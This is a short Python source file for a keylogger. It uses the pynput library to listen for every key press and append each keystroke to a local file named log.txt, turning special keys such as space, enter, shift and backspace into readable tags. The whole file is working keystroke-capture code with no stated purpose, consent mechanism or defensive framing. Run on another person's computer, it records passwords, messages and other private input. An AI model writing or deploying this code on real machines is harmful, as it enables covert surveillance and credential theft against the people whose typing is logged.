
from pynput.keyboard import Listener


def handle_special_keys(keydata):
    if keydata == "Key.space":
        return " "  
    elif keydata == "Key.enter":
        return "\n"  
    elif keydata == "Key.tab":
        return "\t"  
    elif keydata == "Key.shift":
        return "[SHIFT]" 
    elif keydata == "Key.ctrl_l" or keydata == "Key.ctrl_r":
        return "[CTRL]"  
    elif keydata == "Key.alt_l" or keydata == "Key.alt_r":
        return "[ALT]"  
    elif keydata == "Key.caps_lock":
        return "[CAPS LOCK]"  
    elif keydata == "Key.backspace":
        return "[BACKSPACE]"  
    elif keydata == "Key.esc":
        return "[ESC]"  
    else:
        return keydata  


def writetofille(key):  
    keydata = str(key)
    keydata = keydata.replace("'" , "") 

    keydata = handle_special_keys(keydata) 

    with open("log.txt" , "a") as f:
        f.write(keydata)
    



with Listener(on_press =writetofille ) as l :
    l.join()


